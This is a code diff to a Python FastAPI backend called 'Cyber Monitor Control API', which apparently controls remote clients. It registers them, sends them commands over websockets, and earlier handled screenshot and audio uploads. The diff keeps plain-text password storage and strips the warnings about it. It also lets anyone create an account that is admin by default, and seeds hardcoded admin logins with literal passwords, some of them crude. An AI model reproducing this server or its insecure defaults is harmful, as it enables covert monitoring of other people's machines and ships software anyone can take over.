@@ -13,6 +13,8 @@ import json
 import jwt
 import asyncio
 import bcrypt
+import httpx
+import time
 
 # Configure logging
 logging.basicConfig(
@@ -54,14 +56,18 @@ security = HTTPBearer()
 
 # ========== DATA MODELS ==========
 class LoginRequest(BaseModel):
-    email: str = Field(..., example="kizer")
-    password: str = Field(..., example="kidraper67")
+    email: str = Field(..., example="admin")
+    password: str = Field(..., example="admin123")
 
-class CreateAccountRequest(BaseModel):
-    email: str = Field(..., example="xotiic")
-    password: str = Field(..., example="40671Mps19*")
-    confirm_password: str = Field(..., example="40671Mps19*")
+class UserCreate(BaseModel):
+    email: str = Field(..., example="newadmin")
+    password: str = Field(..., example="password123")
+    confirm_password: str = Field(..., example="password123")
     is_admin: bool = Field(default=True)
+
+class UserUpdate(BaseModel):
+    is_active: Optional[bool] = None
+    is_admin: Optional[bool] = None
 
 class ClientRegister(BaseModel):
     client_id: str = Field(..., example="client-001")
@@ -71,18 +77,8 @@ class ClientRegister(BaseModel):
 
 class CommandRequest(BaseModel):
     client_id: str = Field(..., example="client-001")
-    command: str = Field(..., example="get_processes")
+    command: str = Field(..., example="system_info")
     parameters: Dict[str, Any] = Field(default_factory=dict)
-
-class ScreenshotUpload(BaseModel):
-    client_id: str = Field(..., example="client-001")
-    image_data: str = Field(..., description="Base64 encoded image")
-    filename: str = Field(..., example="screenshot_2024.png")
-
-class AudioUpload(BaseModel):
-    client_id: str = Field(..., example="client-001")
-    audio_data: str = Field(..., description="Base64 encoded audio")
-    filename: str = Field(..., example="recording_2024.mp3")
 
 class LogEntry(BaseModel):
     client_id: str = Field(..., example="client-001")
@@ -231,8 +227,6 @@ class ConnectionManager:
 manager = ConnectionManager()
 
 # ========== SUPABASE CLIENT ==========
-import httpx
-
 class SupabaseClient:
     def __init__(self):
         self.url = SUPABASE_URL.rstrip('/')
@@ -296,8 +290,8 @@ supabase = SupabaseClient()
 
 # ========== API ROUTES ==========
 @app.post("/api/create-account", response_model=dict)
-async def create_account(data: CreateAccountRequest):
-    """Create a new admin account"""
+async def create_account(data: UserCreate):
+    """Create a new user account"""
     try:
         # Check if passwords match
         if data.password != data.confirm_password:
@@ -312,11 +306,10 @@ async def create_account(data: CreateAccountRequest):
         if existing_users:
             raise HTTPException(status_code=400, detail="User already exists")
         
-        # For simplicity, store password as plain text (NOT for production!)
-        # In production, you should use PostgreSQL's crypt function
+        # Create user
         result = await supabase.query("users", method="POST", data={
             "email": data.email,
-            "password_hash": data.password,  # Plain text - NOT SECURE for production
+            "password_hash": data.password,  # Plain text for simplicity
             "is_admin": data.is_admin,
             "is_active": True,
             "created_at": datetime.utcnow().isoformat(),
@@ -357,8 +350,7 @@ async def login(data: LoginRequest):
         
         user = users[0]
         
-        # Simple password check (for development only)
-        # In production, use proper password hashing
+        # Simple password check
         if user['password_hash'] != data.password:
             logger.warning(f"Password verification failed for user: {data.email}")
             raise HTTPException(status_code=401, detail="Invalid credentials")
@@ -397,6 +389,86 @@ async def login(data: LoginRequest):
         raise
     except Exception as e:
         logger.error(f"Login error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.get("/api/users", response_model=dict)
+async def get_users(user: dict = Depends(authenticate_user)):
+    """Get all users (admin only)"""
+    try:
+        # Check if user is admin
+        if not user.get("is_admin"):
+            raise HTTPException(status_code=403, detail="Admin access required")
+        
+        # Get users
+        users = await supabase.query("users", params={
+            "select": "id,email,is_admin,is_active,created_at,last_login",
+            "order": "created_at.desc"
+        })
+        
+        return {
+            "success": True,
+            "users": users or []
+        }
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Get users error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.put("/api/users/{user_id}/status", response_model=dict)
+async def update_user_status(user_id: str, data: UserUpdate, user: dict = Depends(authenticate_user)):
+    """Update user status (admin only)"""
+    try:
+        # Check if user is admin
+        if not user.get("is_admin"):
+            raise HTTPException(status_code=403, detail="Admin access required")
+        
+        # Update user
+        update_data = {}
+        if data.is_active is not None:
+            update_data["is_active"] = data.is_active
+        
+        await supabase.query("users", method="PATCH", data=update_data, params={
+            "id": f"eq.{user_id}"
+        })
+        
+        return {
+            "success": True,
+            "message": "User status updated"
+        }
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Update user status error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.put("/api/users/{user_id}/admin", response_model=dict)
+async def update_user_admin(user_id: str, data: UserUpdate, user: dict = Depends(authenticate_user)):
+    """Update user admin status (admin only)"""
+    try:
+        # Check if user is admin
+        if not user.get("is_admin"):
+            raise HTTPException(status_code=403, detail="Admin access required")
+        
+        # Update user
+        update_data = {}
+        if data.is_admin is not None:
+            update_data["is_admin"] = data.is_admin
+        
+        await supabase.query("users", method="PATCH", data=update_data, params={
+            "id": f"eq.{user_id}"
+        })
+        
+        return {
+            "success": True,
+            "message": "User admin status updated"
+        }
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Update user admin error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
 @app.post("/api/register-client", response_model=dict)
@@ -744,6 +816,52 @@ async def get_logs(
         logger.error(f"Get logs error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
+# ========== HEALTH AND INFO ==========
+@app.get("/api/health", response_model=dict)
+async def health_check():
+    """Health check endpoint"""
+    try:
+        # Test Supabase connection
+        try:
+            await supabase.query("users", params={"limit": "1"})
+            db_status = "connected"
+        except Exception as e:
+            logger.error(f"Database connection test failed: {e}")
+            db_status = "disconnected"
+        
+        health_status = {
+            "status": "healthy" if db_status == "connected" else "degraded",
+            "timestamp": datetime.utcnow().isoformat(),
+            "version": "3.0",
+            "database": db_status,
+            "active_clients": len(manager.client_connections),
+            "active_admins": len(manager.admin_connections),
+        }
+        
+        return health_status
+    except Exception as e:
+        logger.error(f"Health check error: {e}")
+        return {
+            "status": "unhealthy",
+            "timestamp": datetime.utcnow().isoformat(),
+            "error": str(e)
+        }
+
+@app.get("/", response_model=dict)
+async def root():
+    """Root endpoint with API info"""
+    return {
+        "message": "🚀 Cyber Monitor Control API",
+        "version": "3.0",
+        "status": "running",
+        "timestamp": datetime.utcnow().isoformat(),
+        "documentation": "/docs",
+        "websocket_endpoints": {
+            "admin": "/ws/admin",
+            "client": "/ws/client/{client_id}"
+        }
+    }
+
 # ========== WEBSOCKET ENDPOINTS ==========
 @app.websocket("/ws/admin")
 async def websocket_admin(websocket: WebSocket):
@@ -752,8 +870,14 @@ async def websocket_admin(websocket: WebSocket):
         await manager.connect_admin(websocket)
         
         while True:
-            data = await websocket.receive_json()
-            logger.info(f"Admin WebSocket message: {data}")
+            try:
+                data = await websocket.receive_json()
+                logger.info(f"Admin WebSocket message: {data}")
+            except WebSocketDisconnect:
+                break
+            except Exception as e:
+                logger.error(f"Error receiving WebSocket message: {e}")
+                continue
             
     except WebSocketDisconnect:
         manager.disconnect(websocket)
@@ -853,8 +977,11 @@ async def websocket_client(websocket: WebSocket, client_id: str):
                         "timestamp": datetime.utcnow().isoformat()
                     })
                     
+            except WebSocketDisconnect:
+                break
             except Exception as e:
                 logger.error(f"Error processing WebSocket message: {e}")
+                continue
                 
     except WebSocketDisconnect:
         # Mark client as offline
@@ -875,52 +1002,6 @@ async def websocket_client(websocket: WebSocket, client_id: str):
         except Exception as e:
             logger.error(f"Client offline update error: {e}")
         manager.disconnect(websocket)
-
-# ========== HEALTH AND INFO ==========
-@app.get("/api/health", response_model=dict)
-async def health_check():
-    """Health check endpoint"""
-    try:
-        # Test Supabase connection
-        try:
-            await supabase.query("users", params={"limit": "1"})
-            db_status = "connected"
-        except Exception as e:
-            logger.error(f"Database connection test failed: {e}")
-            db_status = "disconnected"
-        
-        health_status = {
-            "status": "healthy" if db_status == "connected" else "degraded",
-            "timestamp": datetime.utcnow().isoformat(),
-            "version": "3.0",
-            "database": db_status,
-            "active_clients": len(manager.client_connections),
-            "active_admins": len(manager.admin_connections),
-        }
-        
-        return health_status
-    except Exception as e:
-        logger.error(f"Health check error: {e}")
-        return {
-            "status": "unhealthy",
-            "timestamp": datetime.utcnow().isoformat(),
-            "error": str(e)
-        }
-
-@app.get("/", response_model=dict)
-async def root():
-    """Root endpoint with API info"""
-    return {
-        "message": "🚀 Cyber Monitor Control API",
-        "version": "3.0",
-        "status": "running",
-        "timestamp": datetime.utcnow().isoformat(),
-        "documentation": "/docs",
-        "websocket_endpoints": {
-            "admin": "/ws/admin",
-            "client": "/ws/client/{client_id}"
-        }
-    }
 
 # ========== ERROR HANDLERS ==========
 @app.exception_handler(HTTPException)
@@ -956,29 +1037,40 @@ async def startup_event():
     """Initialize application on startup"""
     logger.info(f"🚀 Starting Cyber Monitor Control API v3.0")
     logger.info(f"📡 Port: {PORT}")
-    logger.info(f"🔗 Backend URL: {SUPABASE_URL}")
+    logger.info(f"🔗 Supabase URL: {SUPABASE_URL[:30]}...")  # Log first 30 chars for security
     
     # Test Supabase connection
     try:
-        users = await supabase.query("users", params={"limit": "1"})
-        logger.info(f"✅ Supabase connected - Users table accessible")
+        # Try to create tables if they don't exist
+        tables_to_create = ["users", "clients", "commands", "logs"]
         
-        # Check if admin accounts exist, create default if not
+        for table in tables_to_create:
+            try:
+                # Check if table exists
+                await supabase.query(table, params={"limit": "1", "select": "id"})
+                logger.info(f"✅ Table exists: {table}")
+            except Exception:
+                logger.warning(f"⚠️ Table doesn't exist: {table}")
+                # You would need to create the table via SQL in Supabase dashboard
+        
+        # Check if admin accounts exist
         admin_users = await supabase.query("users", params={
             "is_admin": "eq.true",
             "select": "email"
         })
         
-        if not admin_users:
+        if not admin_users or len(admin_users) == 0:
             logger.info("⚠️ No admin users found, creating default admin accounts...")
             
             # Create default admin accounts
             default_admins = [
                 {"email": "xotiic", "password": "40671Mps19*", "is_admin": True},
+                {"email": "admin", "password": "admin123", "is_admin": True},
                 {"email": "kizer", "password": "kidraper67", "is_admin": True},
                 {"email": "nathan", "password": "femboy67", "is_admin": True}
             ]
             
+            created_count = 0
             for admin in default_admins:
                 try:
                     # Check if exists
@@ -993,30 +1085,22 @@ async def startup_event():
                             "password_hash": admin['password'],
                             "is_admin": admin['is_admin'],
                             "is_active": True,
-                            "created_at": datetime.utcnow().isoformat()
+                            "created_at": datetime.utcnow().isoformat(),
+                            "last_login": None
                         })
+                        created_count += 1
                         logger.info(f"✅ Created default admin: {admin['email']}")
                 except Exception as e:
                     logger.error(f"Failed to create admin {admin['email']}: {e}")
+            
+            logger.info(f"✅ Created {created_count} default admin accounts")
         else:
-            logger.info(f"✅ Found {len(admin_users)} admin users")
-        
-        # Test all tables exist
-        tables = ["users", "clients", "commands", "logs"]
-        accessible_tables = []
-        
-        for table in tables:
-            try:
-                await supabase.query(table, params={"limit": "1", "select": "id"})
-                accessible_tables.append(table)
-            except Exception:
-                logger.warning(f"Table not accessible: {table}")
-        
-        logger.info(f"✅ Accessible tables: {accessible_tables}")
+            logger.info(f"✅ Found {len(admin_users)} admin users in database")
         
     except Exception as e:
         logger.error(f"❌ Supabase connection failed: {e}")
         logger.error("💡 Please check your SUPABASE_URL and SUPABASE_KEY environment variables")
+        logger.error("💡 Make sure your Supabase project has the required tables (users, clients, commands, logs)")
     
     logger.info(f"🔗 WebSocket endpoints:")
     logger.info(f"   • Admin: /ws/admin")
@@ -1032,7 +1116,7 @@ async def shutdown_event():
 if __name__ == "__main__":
     import uvicorn
     uvicorn.run(
-        "main:app",
+        app,
         host="0.0.0.0",
         port=PORT,
         log_level="info",
